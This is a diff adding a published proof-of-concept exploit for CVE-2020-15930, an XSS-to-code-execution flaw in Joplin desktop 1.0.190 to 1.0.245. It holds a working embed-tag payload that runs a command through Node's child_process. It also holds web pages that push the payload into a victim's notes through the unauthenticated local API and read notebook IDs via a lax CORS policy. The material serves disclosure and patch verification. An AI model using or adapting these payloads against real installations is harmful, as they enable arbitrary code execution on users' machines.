@@ -1,0 +1,49 @@
+# Exploit Title: Joplin 1.0.245 - Arbitrary Code Execution (PoC)
+# Date: 2020-09-21
+# Exploit Author: Ademar Nowasky Junior (@nowaskyjr)
+# Vendor Homepage: https://joplinapp.org/
+# Software Link: https://github.com/laurent22/joplin/releases/download/v1.0.245/Joplin-Setup-1.0.245.exe
+# Version: 1.0.190 to 1.0.245
+# Tested on: Windows / Linux
+# CVE : CVE-2020-15930
+# References:
+# https://github.com/laurent22/joplin/commit/57d750bc9aeb0f98d53ed4b924458b54984c15ff
+
+# 1. Technical Details
+# An XSS issue in Joplin for desktop v1.0.190 to v1.0.245 allows arbitrary code execution via a malicious HTML embed tag.
+# HTML embed tags are not blacklisted in Joplin's renderer. This can be chained with a bug where child windows opened through window.open() have node integration enabled to achieve ACE.
+# If Joplin API is enabled, Remote Code Execution with user interaction is possible by abusing the lack of required authentication in Joplin 'POST /notes' api endpoint to remotely deploy the payload into the victim application.
+
+# 2. PoC
+# Paste the following payload into a note:
+
+<embed src="data:text/html,<script>opener?require(`child_process`).exec(`calc`):open(location)</script>">
+
+# 2.1 RCE with user interaction
+# Enable Joplin API, visit exploit.html and open the created note in Joplin to execute the exploit.
+# By default, notes are stored in the last notebook created.
+
+<!-- exploit.html -->
+<script>
+    x = new XMLHttpRequest;
+    j = {
+        title: "CVE-2020-15930",
+        body: "<embed src='data:text/html,<script>opener?require(`child_process`).exec(`calc`):open(location)<\/script>'>"
+    };
+    x.open("POST", "http://127.0.0.1:41184/notes");
+    x.send(JSON.stringify(j));
+</script>
+
+# To create a note in other notebooks you need the notebook ID. It's possible to get the victim's notebooks IDs due to a relaxed CORS policy in 'GET /folders' endpoint.
+
+<!-- notebooks.html -->
+<script>
+    x = new XMLHttpRequest();
+    x.onreadystatechange = function() {
+        if (x.readyState == XMLHttpRequest.DONE) {
+            alert(x.responseText);
+        }
+    }
+    x.open('GET', 'http://127.0.0.1:41184/folders');
+    x.send();
+</script>
